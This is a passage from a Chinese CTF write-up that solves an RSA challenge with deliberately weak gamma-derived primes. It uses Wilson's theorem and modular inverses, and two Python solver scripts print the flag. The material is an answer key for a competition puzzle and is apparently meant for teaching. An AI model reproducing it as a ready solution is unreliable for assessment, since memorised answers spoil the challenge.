number">6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723922147</span></pre></td></tr><tr><td data-num="28"></td><td><pre>#qA<span class="token operator">=</span><span class="token number">7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477881291</span></pre></td></tr><tr><td data-num="29"></td><td><pre>#qB<span class="token operator">=</span><span class="token number">7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477807457</span></pre></td></tr><tr><td data-num="30"></td><td><pre>#n<span class="token operator">=</span><span class="token number">4451906216583258787166698210560165433649728830889954633721198623488802305844782492171757604711145165920462286487680020347239300947225371917344589502941576734875830871998499135120227347066586066943289430156378296665669974728569678779668142712266780949126509440672273927433367293606776081254094682033167575930701870261219046464773708974194213798032346187463443317770758989273370488582862531630356263732232300508706676725203199729764016766683870925164232508407363688370458877688991733322055785233669885166225464068579486683574954699370175267031949720967812902215635630884502987094547523361027411501285252862476410213277925430392164226297316310465146003494714018456407793759170649913180823814850170639706664167149612984905056804131124522209409607977589884632999710708045656852149371030046919242039957767777840304466948549383597755811307383659188216421501912831203089570725388153416013596114462069777713822433178099904907224119</span></pre></td></tr><tr><td data-num="31"></td><td><pre>#c<span class="token operator">=</span><span class="token number">1996198968748552041728429851810599627895157160099076033250854211280074825148767841655949210593646824507865483166496070951130337321360509148527292165245205219296211294789087358959553387392928560150390604911087085313000622842025416521494799132969818997182731021267942464323979261593380113740152841984062184326431879167516288834455296913822921806893572566867611541664848820247889274979245086440402996661226884320574824077910315143756471444347386795428338020162169391827182914043434253974549636668126789355991920452920806351939782281969098470635517019120996509180703896707990501216102290302162705699788457579330150149320348175742131887213742989509004374645723471497302400169849858253644606818874098604333865973357374444445825761600866472906771935670261641342221394488068630591190697667016958881530367047928341661857241378511420562236766886349565409774340321441504290366223243635878057759623855735794209219474650425139791831374</span></pre></td></tr></table></figure><p><code>hint</code> ：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">注意伽马函数Γ</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>和阶乘x<span class="token operator">!</span>的关系式</pre></td></tr><tr><td data-num="2"></td><td><pre>威尔逊定理</pre></td></tr></table></figure><p>知识点:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">#伽马函数Γ</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>和阶乘x<span class="token operator">!</span>的关系式</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">gamma</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>#威尔逊定理</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">当且仅当p为素数时：</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span> ≡ <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">(</span>mod p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token function">推论：</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">!</span> ≡ <span class="token number">1</span> <span class="token punctuation">(</span>mod p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>#欧拉函数</pre></td></tr><tr><td data-num="9"></td><td><pre>若n是质数p的k次幂，phi <span class="token operator">=</span> p<span class="token operator">**</span>k <span class="token operator">-</span> p<span class="token operator">**</span><span class="token punctuation">(</span>k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>我们需要求 <code>gamma(B+2)%A</code> ，根据伽马函数 Γ(x) 和阶乘 x! 的关系式可知 <code>(B+1)! % A</code> 。<br />
而根据威尔逊定理可知 <code>(A-2)! % A = 1</code> 。<br />
令 <code>x = (A-2)!/(B+1)!``，y = (B+1)!</code> ，所以 <code>x * y ≡ 1 (mod A)。</code> <br />
而我们需要求的是 <code>y % A</code> ，y 是 x 关于 A 的逆元。所以求 <code>x % A</code>  的逆元即可，用欧几里得法求逆.</p>
<p><strong>exp1</strong>:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="3"></td><td><pre>from math <span class="token keyword">import</span> gamma</pre></td></tr><tr><td data-num="4"></td><td><pre>from Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> isPrime</pre></td></tr><tr><td data-num="5"></td><td><pre>#参考大佬的exp完善了一下，<span class="token number">2333</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>def <span class="token function">getNewPrime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token constant">A</span> <span class="token operator">=</span> <span class="token function">getPrime</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token constant">B</span> <span class="token operator">=</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span><span class="token constant">A</span> <span class="token operator">-</span> random<span class="token punctuation">.</span><span class="token function">randint</span><span class="token punctuation">(</span><span class="token number">1e4</span><span class="token punctuation">,</span> <span class="token number">1e5</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span><span class="token function">gamma</span><span class="token punctuation">(</span><span class="token constant">B</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token constant">A</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>def <span class="token function">nextPrime</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    n <span class="token operator">+=</span> <span class="token number">2</span> <span class="token keyword">if</span> n <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">while</span> not <span class="token function">isPrime</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        n <span class="token operator">+=</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">return</span> n</pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>def <span class="token function">getNewPrime2</span><span class="token punctuation">(</span><span class="token constant">A</span><span class="token punctuation">,</span> <span class="token constant">B</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span><span class="token function">gamma2</span><span class="token punctuation">(</span><span class="token constant">B</span><span class="token punctuation">,</span> <span class="token constant">A</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>def <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">while</span> a <span class="token operator">!=</span> <span class="token number">0</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b <span class="token operator">%</span> a<span class="token punctuation">,</span> a</pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">return</span> b</pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>def <span class="token function">findModReverse</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token operator">:</span>  # 这个扩展欧几里得算法求模逆</pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">if</span> <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">return</span> None</pre></td></tr><tr><td data-num="29"></td><td><pre>    u1<span class="token punctuation">,</span> u2<span class="token punctuation">,</span> u3 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a</pre></td></tr><tr><td data-num="30"></td><td><pre>    v1<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> m</pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">while</span> v3 <span class="token operator">!=</span> <span class="token number">0</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        q <span class="token operator">=</span> u3 <span class="token comment">// v3</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        v1<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> u1<span class="token punctuation">,</span> u2<span class="token punctuation">,</span> u3 <span class="token operator">=</span> <span class="token punctuation">(</span>u1 <span class="token operator">-</span> q <span class="token operator">*</span> v1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>u2 <span class="token operator">-</span> q <span class="token operator">*</span> v2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>u3 <span class="token operator">-</span> q <span class="token operator">*</span> v3<span class="token punctuation">)</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v3</pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">return</span> u1 <span class="token operator">%</span> m</pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre>def <span class="token function">gamma2</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    res <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    # <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"final: "</span><span class="token operator">+</span><span class="token function">str</span><span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span>b <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> a <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        res <span class="token operator">=</span> <span class="token punctuation">(</span>res <span class="token operator">*</span> <span class="token function">findModReverse</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> a</pre></td></tr><tr><td data-num="41"></td><td><pre>    # <span class="token function">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">return</span> res</pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre>e <span class="token operator">=</span> <span class="token number">0x10001</span></pre></td></tr><tr><td data-num="45"></td><td><pre>pA <span class="token operator">=</span> <span class="token number">6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723982789</span></pre></td></tr><tr><td data-num="46"></td><td><pre>pB <span class="token operator">=</span> <span class="token number">6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723922147</span></pre></td></tr><tr><td data-num="47"></td><td><pre>qA <span class="token operator">=</span> <span class="token number">7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477881291</span></pre></td></tr><tr><td data-num="48"></td><td><pre>qB <span class="token operator">=</span> <span class="token number">7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477807457</span></pre></td></tr><tr><td data-num="49"></td><td><pre>n <span class="token operator">=</span> <span class="token number">4451906216583258787166698210560165433649728830889954633721198623488802305844782492171757604711145165920462286487680020347239300947225371917344589502941576734875830871998499135120227347066586066943289430156378296665669974728569678779668142712266780949126509440672273927433367293606776081254094682033167575930701870261219046464773708974194213798032346187463443317770758989273370488582862531630356263732232300508706676725203199729764016766683870925164232508407363688370458877688991733322055785233669885166225464068579486683574954699370175267031949720967812902215635630884502987094547523361027411501285252862476410213277925430392164226297316310465146003494714018456407793759170649913180823814850170639706664167149612984905056804131124522209409607977589884632999710708045656852149371030046919242039957767777840304466948549383597755811307383659188216421501912831203089570725388153416013596114462069777713822433178099904907224119</span></pre></td></tr><tr><td data-num="50"></td><td><pre>c <span class="token operator">=</span> <span class="token number">1996198968748552041728429851810599627895157160099076033250854211280074825148767841655949210593646824507865483166496070951130337321360509148527292165245205219296211294789087358959553387392928560150390604911087085313000622842025416521494799132969818997182731021267942464323979261593380113740152841984062184326431879167516288834455296913822921806893572566867611541664848820247889274979245086440402996661226884320574824077910315143756471444347386795428338020162169391827182914043434253974549636668126789355991920452920806351939782281969098470635517019120996509180703896707990501216102290302162705699788457579330150149320348175742131887213742989509004374645723471497302400169849858253644606818874098604333865973357374444445825761600866472906771935670261641342221394488068630591190697667016958881530367047928341661857241378511420562236766886349565409774340321441504290366223243635878057759623855735794209219474650425139791831374</span></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token function">#求</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">/</span><span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>pA <span class="token function">的逆元，等于</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>pA <span class="token function">，等于gamma</span><span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span>pA</pre></td></tr><tr><td data-num="53"></td><td><pre>p <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="54"></td><td><pre>max <span class="token operator">=</span> <span class="token punctuation">(</span>pA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>max<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="56"></td><td><pre>	p <span class="token operator">=</span> p <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span><span class="token function">invert</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pA<span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pA<span class="token punctuation">)</span> <span class="token operator">%</span> pA</pre></td></tr><tr><td data-num="57"></td><td><pre>p <span class="token operator">=</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token function">#print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token function">#求</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>qA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">/</span><span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>qA <span class="token function">的逆元，等于</span><span class="token punctuation">(</span><span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>qA <span class="token function">，等于gamma</span><span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span>qA</pre></td></tr><tr><td data-num="60"></td><td><pre>q <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="61"></td><td><pre>max <span class="token operator">=</span> <span class="token punctuation">(</span>qA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>max<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="63"></td><td><pre>	q <span class="token operator">=</span> q <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span><span class="token function">invert</span><span class="token punctuation">(</span><span class="token punctuation">(</span>qA<span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>qA<span class="token punctuation">)</span> <span class="token operator">%</span> qA</pre></td></tr><tr><td data-num="64"></td><td><pre>q <span class="token operator">=</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token function">#print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>#p <span class="token operator">=</span> <span class="token number">721295413363782943575290202453254405609384962866760177823574558139524613289380285395875654962467791028293949737699221240830187032744030384932819874799211</span></pre></td></tr><tr><td data-num="67"></td><td><pre>#q <span class="token operator">=</span> <span class="token number">3112046822677655775872849946553212669700408142233774149727014153992463597788397754366224491840784669131576610049264423785236897140841668817147645049635999</span></pre></td></tr><tr><td data-num="68"></td><td><pre></pre></td></tr><tr><td data-num="69"></td><td><pre>fn <span class="token operator">=</span> <span class="token function">getNewPrime2</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre><span class="token function">#print</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="71"></td><td><pre>#fn <span class="token operator">=</span> <span class="token number">3</span></pre></td></tr><tr><td data-num="72"></td><td><pre>r <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span><span class="token function">iroot</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span><span class="token function">mpz</span><span class="token punctuation">(</span>n<span class="token comment">//(p*q*q)),3)[0]</span></pre></td></tr><tr><td data-num="73"></td><td><pre><span class="token function">#print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre>#r <span class="token operator">=</span> <span class="token number">8605581006163978513558138296576032102733660218879126657600237911024254611499452345790192297532366960817162346945271546520036031830535178172751208076290109</span></pre></td></tr><tr><td data-num="75"></td><td><pre></pre></td></tr><tr><td data-num="76"></td><td><pre>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">*</span> q <span class="token operator">-</span> q<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>r <span class="token operator">*</span> r <span class="token operator">*</span> r <span class="token operator">-</span> r <span class="token operator">*</span> r<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="77"></td><td><pre>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span><span class="token function">invert</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre><span class="token function">#print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="79"></td><td><pre>#d<span class="token operator">=</span><span class="token number">3893796118845369439235581551299559681130294433914324573287346480568253612056224380636546037500153379857589128641230243165297526124111655151656456885394718320571011164662139031101601805935834789093718455506105414382703229813895443438508544153175032701351201540968823002419519523214390287666578730407931246445871807183537209694071828922295499346083880163169003198594519162159452952535381034048239423912932288087394862004236172433929593269810986943713662824358214779552898877881697861535560993274391395357266197384454357803117633435524780866783488594161973423232638616086772861225974312225600055495130373828730995856136891951667049900975798958834487417185610258985145585210434281769923883162243531194314167637519779543778335295761192135358383400455687647479329697758466764046259467201396085554561420952266156396111233306174055533779858729332820780458072338771340688204365931674201918683102590056383442579221021315973279544753</span></pre></td></tr><tr><td data-num="80"></td><td><pre>m <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="81"></td><td><pre></pre></td></tr><tr><td data-num="82"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="83"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span><span class="token function">unhexlify</span><span class="token punctuation">(</span><span class="token function">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><strong>exp2</strong>:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>#纯大佬exp，小编xue微改了一下运行中出现的问题，大佬勿怪</pre></td></tr><tr><td data-num="2"></td><td><pre>from math <span class="token keyword">import</span> gamma</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="6"></td><td><pre>from Cryptodome<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>def <span class="token function">nextPrime</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    n <span class="token operator">+=</span> <span class="token number">2</span> <span class="token keyword">if</span> n <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">while</span> not <span class="token function">isPrime</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        n <span class="token operator">+=</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">return</span> n</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>def <span class="token function">getNewPrime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token constant">A</span> <span class="token operator">=</span> <span class="token function">getPrime</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token constant">B</span> <span class="token operator">=</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span><span class="token constant">A</span> <span class="token operator">-</span> random<span class="token punctuation">.</span><span class="token function">randint</span><span class="token punctuation">(</span><span class="token number">1e4</span><span class="token punctuation">,</span><span class="token number">1e5</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span><span class="token function">gamma</span><span class="token punctuation">(</span><span class="token constant">B</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token constant">A</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>pA<span class="token operator">=</span><span class="token number">6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723982789</span></pre></td></tr><tr><td data-num="20"></td><td><pre>pB<span class="token operator">=</span><span class="token number">6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723922147</span></pre></td></tr><tr><td data-num="21"></td><td><pre>qA<span class="token operator">=</span><span class="token number">7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477881291</span></pre></td></tr><tr><td data-num="22"></td><td><pre>qB<span class="token operator">=</span><span class="token number">7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477807457</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>e <span class="token operator">=</span> <span class="token number">0x10001</span></pre></td></tr><tr><td data-num="25"></td><td><pre>n<span class="token operator">=</span><span class="token number">4451906216583258787166698210560165433649728830889954633721198623488802305844782492171757604711145165920462286487680020347239300947225371917344589502941576734875830871998499135120227347066586066943289430156378296665669974728569678779668142712266780949126509440672273927433367293606776081254094682033167575930701870261219046464773708974194213798032346187463443317770758989273370488582862531630356263732232300508706676725203199729764016766683870925164232508407363688370458877688991733322055785233669885166225464068579486683574954699370175267031949720967812902215635630884502987094547523361027411501285252862476410213277925430392164226297316310465146003494714018456407793759170649913180823814850170639706664167149612984905056804131124522209409607977589884632999710708045656852149371030046919242039957767777840304466948549383597755811307383659188216421501912831203089570725388153416013596114462069777713822433178099904907224119</span></pre></td></tr><tr><td data-num="26"></td><td><pre>c<span class="token operator">=</span><span class="token number">1996198968748552041728429851810599627895157160099076033250854211280074825148767841655949210593646824507865483166496070951130337321360509148527292165245205219296211294789087358959553387392928560150390604911087085313000622842025416521494799132969818997182731021267942464323979261593380113740152841984062184326431879167516288834455296913822921806893572566867611541664848820247889274979245086440402996661226884320574824077910315143756471444347386795428338020162169391827182914043434253974549636668126789355991920452920806351939782281969098470635517019120996509180703896707990501216102290302162705699788457579330150149320348175742131887213742989509004374645723471497302400169849858253644606818874098604333865973357374444445825761600866472906771935670261641342221394488068630591190697667016958881530367047928341661857241378511420562236766886349565409774340321441504290366223243635878057759623855735794209219474650425139791831374</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token function">#求</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">/</span><span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>pA <span class="token function">的逆元，等于</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>pA <span class="token function">，等于gamma</span><span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span>pA</pre></td></tr><tr><td data-num="29"></td><td><pre>p <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="30"></td><td><pre>max <span class="token operator">=</span> <span class="token punctuation">(</span>pA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>max<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>	p <span class="token operator">=</span> p <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span><span class="token function">invert</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pA<span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token 